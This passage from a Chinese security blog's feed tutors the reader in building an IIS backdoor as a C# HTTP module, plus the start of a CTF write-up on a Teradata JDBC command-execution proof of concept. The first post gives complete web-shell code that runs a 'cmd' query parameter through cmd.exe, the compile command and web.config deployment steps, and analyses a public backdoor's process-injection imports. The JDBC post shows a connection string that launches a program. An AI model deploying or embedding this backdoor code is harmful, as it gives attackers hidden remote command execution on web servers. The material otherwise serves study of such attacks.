class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// do somthing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过new EventHandler()新建一个事件，我们新加事件时需要保证自己的方法和EventHandler方法签名一致。即传递<code>object sender, EventArgs e</code>两个参数，返回类型为void。</p><p>在<code>Context_PreRequestHandlerExecute</code>中，我们想干什么就干什么。</p><p><strong>(简单点说就是我们可以在Context_PreRequestHandlerExecute函数中写我们想要对传入的请求做任何操作)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">private void Context_PreRequestHandlerExecute(object sender, EventArgs e)</span><br><span class="line">&#123;</span><br><span class="line">    HttpApplication app = (HttpApplication)sender;</span><br><span class="line">    HttpRequest request = app.Context.Request;</span><br><span class="line">    HttpResponse response = app.Context.Response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过sender拿到HttpApplication上下文。有了request和response我们就可以拿到参数，执行命令拿到结果，然后写入response了。    </p><p><strong>(这个思路可以引申到内存马那了)</strong></p><p>接下来是一个简单的<code>iis_backdoor.cs</code>  实战的话不建议用这个简单的马   因为会把默认页面给替换掉  可以用上面的<a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  这个马  </p><p>或者自己改进一下也行</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">IIS_BackDoor</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">MyModule</span> : <span class="title">IHttpModule</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Dispose</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Init</span>(<span class="params">HttpApplication context</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            context.PreRequestHandlerExecute += <span class="keyword">new</span> EventHandler(Context_PreRequestHandlerExecute);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Context_PreRequestHandlerExecute</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            HttpApplication app = (HttpApplication)sender;</span><br><span class="line">            HttpRequest request = app.Context.Request;</span><br><span class="line">            HttpResponse response = app.Context.Response;</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> cmd = request.QueryString.Get(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                Process proc = <span class="keyword">new</span> Process();</span><br><span class="line">                proc.StartInfo.CreateNoWindow = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.FileName = <span class="string">&quot;cmd.exe&quot;</span>;</span><br><span class="line">                proc.StartInfo.UseShellExecute = <span class="literal">false</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardError = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardInput = <span class="literal">true</span>;</span><br><span class="line">                proc.StartInfo.RedirectStandardOutput = <span class="literal">true</span>;</span><br><span class="line">                proc.Start();</span><br><span class="line">                proc.StandardInput.WriteLine(cmd);</span><br><span class="line">                proc.StandardInput.WriteLine(<span class="string">&quot;exit&quot;</span>);</span><br><span class="line">                <span class="built_in">string</span> outStr = proc.StandardOutput.ReadToEnd();</span><br><span class="line">                proc.Close();</span><br><span class="line">                response.Clear();</span><br><span class="line">                response.BufferOutput = <span class="literal">true</span>;</span><br><span class="line">                response.Write(outStr);</span><br><span class="line">                response.End();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception err)</span><br><span class="line">            &#123;</span><br><span class="line">                response.Write(err.Message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从参数中获取cmd，然后写入resp。编译dll之后来部署dll。</p><p>编译dll过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\csc.exe /target:library /out:IIS_BackDoor.dll IIS_BackDoor.cs</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240404161010200.png" alt="image-20240404161010200"></p><h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>在网站目录下写入web.config（<strong>如果已经有的话就在其基础上添加就行</strong>）</p><p><img src="../images/image-20240404161154904.png" alt="image-20240404161154904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;modules&gt;</span><br><span class="line">      &lt;add name=&quot;IIS_BackDoor&quot; type=&quot;IIS_BackDoor.MyModule&quot;/&gt;</span><br><span class="line">    &lt;/modules&gt;</span><br><span class="line">  &lt;/system.webServer&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//IIS_BackDoor是dll名字   MyModule是我们写的处理http请求的一个类</span><br></pre></td></tr></table></figure><p>然后将dll存入bin文件夹下就行了</p><p><img src="../images/image-20240404161349101.png" alt="image-20240404161349101"></p><p><img src="../images/image-20240404161419781.png" alt="image-20240404161419781"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\inetsrv\appcmd list site</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//这个命令可以查看在iis这个服务器运行的所有网站（包括端口和文件地址）</span><br></pre></td></tr></table></figure><p>这里的话只是简单的理解一下  功能的话还是觉得是<a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  这个写的好点  但是都是5年前的东西了  感兴趣的可以进行修改一下  添加点功能上去</p><h2 id="分析github项目IIS-backdoor"><a href="#分析github项目IIS-backdoor" class="headerlink" title="分析github项目IIS_backdoor"></a>分析github项目IIS_backdoor</h2><p><a href="https://github.com/WBGlIl/IIS_backdoor/tree/master">https://github.com/WBGlIl/IIS_backdoor/tree/master</a>  </p><p>直接clone下来导入到源码来进行查看</p><p><img src="../images/image-20240404164853731.png" alt="image-20240404164853731"></p><p>上面的是核心代码  下面的话是写的一个ui</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SecurityAttributes</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> Int32 Length = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpSecurityDescriptor = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> <span class="built_in">bool</span> bInheritHandle = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="title">SecurityAttributes</span>()</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">this</span>.Length = Marshal.SizeOf(<span class="keyword">this</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">struct</span> ProcessInformation</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hProcess;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hThread;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwProcessId;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwThreadId;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">Flags</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="built_in">enum</span> CreateProcessFlags : <span class="built_in">uint</span></span><br><span class="line">       &#123;</span><br><span class="line">           DEBUG_PROCESS = <span class="number">0x00000001</span>,</span><br><span class="line">           DEBUG_ONLY_THIS_PROCESS = <span class="number">0x00000002</span>,</span><br><span class="line">           CREATE_SUSPENDED = <span class="number">0x00000004</span>,</span><br><span class="line">           DETACHED_PROCESS = <span class="number">0x00000008</span>,</span><br><span class="line">           CREATE_NEW_CONSOLE = <span class="number">0x00000010</span>,</span><br><span class="line">           NORMAL_PRIORITY_CLASS = <span class="number">0x00000020</span>,</span><br><span class="line">           IDLE_PRIORITY_CLASS = <span class="number">0x00000040</span>,</span><br><span class="line">           HIGH_PRIORITY_CLASS = <span class="number">0x00000080</span>,</span><br><span class="line">           REALTIME_PRIORITY_CLASS = <span class="number">0x00000100</span>,</span><br><span class="line">           CREATE_NEW_PROCESS_GROUP = <span class="number">0x00000200</span>,</span><br><span class="line">           CREATE_UNICODE_ENVIRONMENT = <span class="number">0x00000400</span>,</span><br><span class="line">           CREATE_SEPARATE_WOW_VDM = <span class="number">0x00000800</span>,</span><br><span class="line">           CREATE_SHARED_WOW_VDM = <span class="number">0x00001000</span>,</span><br><span class="line">           CREATE_FORCEDOS = <span class="number">0x00002000</span>,</span><br><span class="line">           BELOW_NORMAL_PRIORITY_CLASS = <span class="number">0x00004000</span>,</span><br><span class="line">           ABOVE_NORMAL_PRIORITY_CLASS = <span class="number">0x00008000</span>,</span><br><span class="line">           INHERIT_PARENT_AFFINITY = <span class="number">0x00010000</span>,</span><br><span class="line">           INHERIT_CALLER_PRIORITY = <span class="number">0x00020000</span>,</span><br><span class="line">           CREATE_PROTECTED_PROCESS = <span class="number">0x00040000</span>,</span><br><span class="line">           EXTENDED_STARTUPINFO_PRESENT = <span class="number">0x00080000</span>,</span><br><span class="line">           PROCESS_MODE_BACKGROUND_BEGIN = <span class="number">0x00100000</span>,</span><br><span class="line">           PROCESS_MODE_BACKGROUND_END = <span class="number">0x00200000</span>,</span><br><span class="line">           CREATE_BREAKAWAY_FROM_JOB = <span class="number">0x01000000</span>,</span><br><span class="line">           CREATE_PRESERVE_CODE_AUTHZ_LEVEL = <span class="number">0x02000000</span>,</span><br><span class="line">           CREATE_DEFAULT_ERROR_MODE = <span class="number">0x04000000</span>,</span><br><span class="line">           CREATE_NO_WINDOW = <span class="number">0x08000000</span>,</span><br><span class="line">           PROFILE_USER = <span class="number">0x10000000</span>,</span><br><span class="line">           PROFILE_KERNEL = <span class="number">0x20000000</span>,</span><br><span class="line">           PROFILE_SERVER = <span class="number">0x40000000</span>,</span><br><span class="line">           CREATE_IGNORE_SYSTEM_DEFAULT = <span class="number">0x80000000</span>,</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       [<span class="meta">StructLayout(LayoutKind.Sequential)</span>]</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">StartupInfo</span></span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">public</span> Int32 cb = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpReserved = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpDesktop = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpTitle = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwX = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwY = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwXSize = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwYSize = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwXCountChars = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwYCountChars = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwFillAttribute = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int32 dwFlags = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int16 wShowWindow = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> Int16 cbReserved2 = <span class="number">0</span>;</span><br><span class="line">           <span class="keyword">public</span> IntPtr lpReserved2 = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdInput = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdOutput = IntPtr.Zero;</span><br><span class="line">           <span class="keyword">public</span> IntPtr hStdError = IntPtr.Zero;</span><br><span class="line">           <span class="function"><span class="keyword">public</span> <span class="title">StartupInfo</span>()</span></span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">this</span>.cb = Marshal.SizeOf(<span class="keyword">this</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateProcessA</span>(<span class="params">String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">               IntPtr lpEnvironment,</span></span></span><br><span class="line"><span class="params"><span class="function">               String lpCurrentDirectory,</span></span></span><br><span class="line"><span class="params"><span class="function">               [In] StartupInfo lpStartupInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">               <span class="keyword">out</span> ProcessInformation lpProcessInformation</span></span></span><br><span class="line"><span class="params"><span class="function"></span></span></span><br><span class="line"><span class="params"><span class="function">           </span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">VirtualAllocEx</span>(<span class="params">IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect</span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="built_in">bool</span> <span class="title">WriteProcessMemory</span>(<span class="params">IntPtr hProcess, IntPtr lpBaseAddress, <span class="built_in">byte</span>[] buffer, IntPtr dwSize, <span class="built_in">int</span> lpNumberOfBytesWritten</span>)</span>;</span><br><span class="line"></span><br><span class="line">       [<span class="meta">DllImport(<span class="string">&quot;kernel32.dll&quot;</span>)</span>]</span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateRemoteThread</span>(<span class="params">IntPtr hProcess, IntPtr lpThreadAttributes, <span class="built_in">uint</span> dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, <span class="built_in">uint</span> dwCreationFlags, IntPtr lpThreadId</span>)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> UInt32 PAGE_EXECUTE_READWRITE = <span class="number">0x40</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">static</span> UInt32 MEM_COMMIT = <span class="number">0x1000</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这是在写IHttpModule接口之前写的代码  我们来分析这个代码是干啥的  直接掏gpt的答案过来问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这段代码是用来调用 Windows 操作系统的核心功能来创建进程并在远程进程中执行代码的。让我逐步解释一下：</span><br><span class="line"></span><br><span class="line">SecurityAttributes 结构体用于指定新进程和线程的安全属性。这个结构体包含了安全描述符、长度和一个布尔值，指示新进程或线程是否继承了句柄的访问权限。</span><br><span class="line"></span><br><span class="line">ProcessInformation 结构体包含了有关新创建进程的信息，例如进程句柄、主线程句柄以及进程和线程的标识号。</span><br><span class="line"></span><br><span class="line">CreateProcessFlags 枚举定义了创建进程时的一系列标志位，比如是否调试进程、是否创建一个新的控制台窗口等。</span><br><span class="line"></span><br><span class="line">StartupInfo 结构体包含了一系列启动信息，例如窗口显示方式、标准输入输出等。</span><br><span class="line"></span><br><span class="line">接下来是一系列的 DllImport 属性，用于声明对 kernel32.dll 中的一些函数的引用，这些函数包括：</span><br><span class="line"></span><br><span class="line">CreateProcessA: 创建一个新进程和它的主线程。</span><br><span class="line">VirtualAllocEx: 在远程进程的虚拟地址空间中分配内存。</span><br><span class="line">WriteProcessMemory: 写入数据到远程进程的内存中。</span><br><span class="line">CreateRemoteThread: 在远程进程中创建一个新的线程并从指定地址开始执行。</span><br><span class="line">最后，定义了一些常量，用于指定内存分配和权限。这些常量在调用上述函数时用作参数。</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>综合来看，这段代码的主要功能是通过调用 Windows 操作系统提供的函数，实现了创建进程、在远程进程中分配内存、写入数据以及在远程进程中创建线程并执行代码的功能。</strong></p><p>接着看其的核心Module代码</p><p><img src="../images/image-20240404165243402.png" alt="image-20240404165243402"></p><p>都是大同小异  都是在这个Init函数中选订阅事件来进行处理  只不过这里用的是<code>BeginRequest</code> 用的不是<code>PreRequestHandlerExecute</code>   两者的差别应该不大  都是在请求之前进行处理</p><p><img src="../images/image-20240404165549929.png" alt="image-20240404165549929"></p><p>这些事作者写的几个功能点  代码和上面写的都差不多</p><p><img src="../images/image-20240404165840282.png" alt="image-20240404165840282"></p><p>然后走进这个函数  获取到请求  就会走进context_filter函数中去</p><p><img src="../images/image-20240404165917703.png" alt="image-20240404165917703"></p><p>在这个函数中就先获取我们的请求  看看事cmd还是什么  使用if来进行判断  判断成功获取cookie的value值  并且走进对应的函数进行执行</p><p>想要加什么功能点的话就直接写对应的函数  然后再<code>context_filter</code>这个函数中添加if判断就行了</p><p>(可能在学内存马的时候我会写一写)</p><p>ui就不分析了</p><h2 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h2><p> <code>HttpContext</code> 和 <code>HttpRequest</code> 之间的关系。</p><ol><li><strong>HttpRequest</strong>：<code>HttpRequest</code> 是 <code>HttpContext</code> 中的一部分，它代表了 HTTP 请求的具体内容，包括 URL、HTTP 方法、请求头、查询参数等。通过 <code>HttpRequest</code> 对象，你可以获取请求的具体内容。</li><li><strong>HttpContext</strong>：<code>HttpContext</code> 对象包含了当前 HTTP 请求的上下文信息，包括 <code>HttpRequest</code>、<code>HttpResponse</code>、<code>HttpServerUtility</code> 等属性。它提供了对整个请求和响应的访问和操作。所以，通过 <code>HttpContext</code>，你可以获取到当前请求的 <code>HttpRequest</code> 对象，进而访问请求的具体内容。</li></ol><p>所以，虽然 <code>Request</code> 属性通常用于获取请求的具体内容，但它实际上是 <code>HttpContext</code> 对象中的一个属性。通过 <code>Request</code>，你可以直接获取到当前请求的 <code>HttpRequest</code> 对象，进而获取请求的参数等信息。</p><p>综上所述，通过 <code>Request</code> 或 <code>HttpContext.Request</code>，你都可以获取到当前请求的参数等信息，只不过前者是通过 <code>HttpContext</code> 对象的属性访问，后者是直接通过 <code>HttpContext</code> 对象的一个属性访问。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://y4er.com/posts/using-csharp-to-develop-the-iis-module-backdoor/#%E5%8F%82%E8%80%83&quot;&gt;https://y4er.com/posts/using-csharp-</summary>
      
    
    
    
    
    <category term="dotnet" scheme="https://ke1nys.github.io/tags/dotnet/"/>
    
  </entry>
  
  <entry>
    <title>Dubhe2024-Javolution</title>
    <link href="https://ke1nys.github.io/posts/84f22eff.html"/>
    <id>https://ke1nys.github.io/posts/84f22eff.html</id>
    <published>2024-03-19T07:06:34.000Z</published>
    <updated>2024-04-18T12:57:04.535Z</updated>
    
    <content type="html"><![CDATA[<p>因为之前再看那个绕高版本的jdk的jndi注入的时候  就有提到用jndi转JDBC来打  当时就是看看  没有实践  现在刚好这次比赛出了jdk17打JDBC的题  这里就记录一下</p><h2 id="Teradata-JDBC"><a href="#Teradata-JDBC" class="headerlink" title="Teradata JDBC"></a>Teradata JDBC</h2><p><a href="https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf">https://i.blackhat.com/Asia-23/AS-23-Yuanzhen-A-new-attack-interface-in-Java.pdf</a></p><p><a href="https://github.com/luelueking/Deserial_Sink_With_JDBC">https://github.com/luelueking/Deserial_Sink_With_JDBC</a></p><p>python运行那两个脚本就行了</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><img src="../images/image-20240319152109847.png" alt="image-20240319152109847"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> SQLException, IOException &#123;</span><br><span class="line">        DriverManager.registerDriver(<span class="keyword">new</span> <span class="title class_">com</span>.teradata.jdbc.TeraDriver());</span><br><span class="line">        DriverManager.getConnection(<span class="string">&quot;jdbc:teradata://127.0.0.1/DBS_PORT=10250,LOGMECH=BROWSER,BROWSER=&#x27;calc&#x27;,TYPE=DEFAULT,COP=OFF,TMODE=TERA,LOG=DEBUG&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20240319152202551.png" alt="image-20240319152202551"></p><p>跟进这个getConnection函数</p><p><img src="../images/image-20240319152250143.png" alt="image-20240319152250143"></p><p>再次跟进这个getConnection函数中去</p><p><img src="../images/image-20240319152322791.png" alt="image-20240319152322791"></p><p>接着跟进这个connnect函数中</p><p><img src="../images/image-20240319152340172.png" alt="image-20240319152340172"></p><p>跟进doConnect函数中</p><p><img src="../images/image-20240319152433806.png" alt="image-20240319152433806"></p><p>这个函数会拆分我们传入的url参数  并将值挨个提取出来</p><p><img src="../images/image-20240319152521730.png" alt="image-20240319152521730"></p><p>接着跟进createConnection函数中</p><p><img src="../images/image-20240319152548590.png" alt="image-20240319152548590"></p><p>再次跟进createConnection函数中</p><p><img src="../images/image-20240319152752314.png" alt="image-20240319152752314"></p><p>满足if判断  进入到TDSession函数中</p><p><img src="../images/image-20240319152833423.png" alt="image-20240319152833423"></p><p><img src="../images/image-20240319152901528.png" alt="image-20240319152901528"></p><p>携带我们传入的参数进入到其父类的构造函数中去</p><p><img src="../images/image-20240319152932248.png" alt="image-20240319152932248"></p><p>最后在GenericTeradataConnection的构造函数中执行了命令</p><p>这就是这个漏洞的成因  那么我们就只需要找到前半段链子来连接上getConnetion就行了</p><p>(接下来回归到题目本身)</p><h2 id="Javolution"><a href="#Javolution" class="headerlink" title="Javolution"></a>Javolution</h2><p><a 